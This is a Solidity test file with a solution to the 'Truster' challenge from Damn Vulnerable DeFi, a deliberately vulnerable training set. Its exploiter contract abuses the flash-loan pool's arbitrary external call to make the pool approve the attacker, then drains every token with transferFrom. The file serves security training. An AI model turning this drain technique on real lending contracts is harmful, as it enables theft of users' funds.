// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterExploiter {
    /**
     * @notice Attack is fully contained in the constructor — one deployment = full exploit
     * 
     * Attack flow:
     * 1. Craft calldata to make the POOL approve THIS contract to spend all its tokens
     * 2. Trigger flashloan with amount=0 so no repayment needed, but callback still fires
     * 3. Pool executes approve() on our behalf — we now have unlimited allowance
     * 4. Call transferFrom() to drain all tokens from pool to recovery address
     */
    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {

        // Step 1: Craft calldata for token.approve(this, poolBalance)
        // This will be executed BY THE POOL via functionCall() inside flashLoan
        // So msg.sender during approve() = the pool itself = pool approves us
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),                          // spender = this exploiter contract
            _token.balanceOf(address(_pool))        // amount = entire pool balance
        );

        // Step 2: Trigger flashLoan with:
        // amount   = 0    → no tokens borrowed, no repayment needed, balance check passes
        // borrower = this → irrelevant since amount is 0
        // target   = token contract → pool will call token.functionCall(data)
        // data     = approve calldata crafted above
        // Result: pool calls token.approve(this, poolBalance) as itself
        _pool.flashLoan(0, address(this), address(_token), data);

        // Step 3: Now that pool has approved us, drain all tokens to recovery
        // transferFrom(pool → recovery, entire balance)
        // This works because pool just approved us in the step above
        _token.transferFrom(
            address(_pool),                         // from: the pool (approved us)
            _recovery,                              // to: recovery address
            _token.balanceOf(address(_pool))        // amount: drain everything
        );
    }
}


contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    // Test function — simply deploys the exploiter contract
    // All attack logic runs inside the constructor, so one line is enough
    function test_truster() public checkSolvedByPlayer {
        new TrusterExploiter(pool, token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
